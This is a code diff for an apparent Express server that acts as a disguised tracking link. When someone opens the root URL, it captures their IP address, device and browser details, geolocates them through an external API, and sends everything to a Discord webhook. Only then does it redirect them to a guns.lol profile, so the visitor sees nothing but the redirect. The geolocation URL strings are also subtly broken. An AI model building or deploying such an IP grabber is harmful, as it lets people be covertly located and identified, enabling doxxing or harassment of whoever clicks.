@@ -13,17 +13,26 @@ app.use(useragent.express());
 // Securely access the Discord Webhook from Render environment variables
 const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 
-// CHANGED: Triggered on the main link directly (no /track required)
 app.get('/', async (req, res) => {
-    // 1. Instantly capture incoming IP address variants
-    let clientIp = req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    
-    // Clean up proxy strings if multiple IPs are forwarded
-    if (clientIp && clientIp.includes(',')) {
-        clientIp = clientIp.split(',')[0].trim();
+    // 1. Capture the initial incoming proxy header string
+    let rawIp = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
+    let clientIp = '';
+
+    // 2. Safely isolate the very first IP in the proxy chain and remove any spaces
+    if (rawIp) {
+        if (rawIp.includes(',')) {
+            clientIp = rawIp.split(',')[0].trim();
+        } else {
+            clientIp = rawIp.trim();
+        }
     }
 
-    // 2. Format device information using the middleware parsing results
+    // Strip legacy IPv6 loopback routing prefixes if present
+    if (clientIp && clientIp.startsWith('::ffff:')) {
+        clientIp = clientIp.replace('::ffff:', '');
+    }
+
+    // 3. Format device information using the middleware parsing results
     let deviceType = "Desktop/Laptop";
     if (req.useragent.isMobile) deviceType = "Mobile Phone";
     if (req.useragent.isTablet) deviceType = "Tablet";
@@ -33,39 +42,39 @@ app.get('/', async (req, res) => {
     const browserName = req.useragent.browser || "Unknown Browser";
     const rawUserAgent = req.headers['user-agent'] || "Unknown User Agent";
 
-    // 3. Define defaults for network and geographic data
+    // 4. Define defaults for network and geographic data
     let locationData = {
         country: "Unknown / Cloud Proxy",
         city: "Unknown",
         isp: "Unknown Network Provider"
     };
 
-    // 4. Perform a background lookup if it is a valid public IP address
-    if (clientIp && clientIp !== '127.0.0.1' && clientIp !== '::1' && !clientIp.startsWith('::ffff:127.')) {
+    // 5. Perform an HTTPS background lookup if it is a valid public IP address
+    if (clientIp && clientIp !== '127.0.0.1' && clientIp !== '::1') {
         try {
-            // Using a free, lightweight IP API endpoint specifying desired fields
-            const lookupUrl = `http://ip-api.com{clientIp}?fields=status,country,city,isp`;
-            const response = await fetch(lookupUrl);
-            const data = await response.json();
-            
-            if (data && data.status === 'success') {
-                if (data.country) locationData.country = data.country;
-                if (data.city) locationData.city = data.city;
-                if (data.isp) locationData.isp = data.isp;
+            // Using ipapi.co via HTTPS for secure, reliable container networking
+            const response = await fetch(`https://ipapi.co{clientIp}/json/`);
+            if (response.ok) {
+                const data = await response.json();
+                if (!data.error) {
+                    locationData.country = data.country_name || "Unknown Country";
+                    locationData.city = data.city || "Unknown City";
+                    locationData.isp = data.org || "Unknown Network Provider";
+                }
             }
         } catch (error) {
             console.error("[Backend Error] Geolocation resolution failed:", error.message);
         }
     }
 
-    // 5. Structure a Discord Rich Embed payload with the requested metrics
+    // 6. Structure a Discord Rich Embed payload with the requested metrics
     const discordPayload = {
         username: "Traffic Logger System",
         avatar_url: "https://imgur.com", 
         embeds: [{
             title: "📥 Incoming Connection Analyzed",
             description: `A client initiated a request and was automatically routed to your guns.lol profile.`,
-            color: 5814783, // Elegant blurple/blue color block
+            color: 5814783, 
             fields: [
                 { name: "🌐 Public IP Address", value: `\`${clientIp}\``, inline: true },
                 { name: "📡 Network Operator (ISP)", value: `\`${locationData.isp}\``, inline: true },
@@ -80,7 +89,7 @@ app.get('/', async (req, res) => {
         }]
     };
 
-    // 6. Forward the payload to the Discord Webhook asynchronously
+    // 7. Forward the payload to the Discord Webhook asynchronously
     try {
         if (DISCORD_WEBHOOK_URL) {
             await fetch(DISCORD_WEBHOOK_URL, {
@@ -88,14 +97,12 @@ app.get('/', async (req, res) => {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(discordPayload)
             });
-        } else {
-            console.log("[Notice] Logging event locally. (Discord Webhook environment variable not set).");
         }
     } catch (webhookError) {
         console.error("[Backend Error] Could not post payload to Discord:", webhookError.message);
     }
 
-    // 7. Complete the final execution requirement by redirecting the client browser
+    // 8. Redirect the user to your landing page
     return res.redirect(302, 'https://guns.lol/xsaint');
 });
 
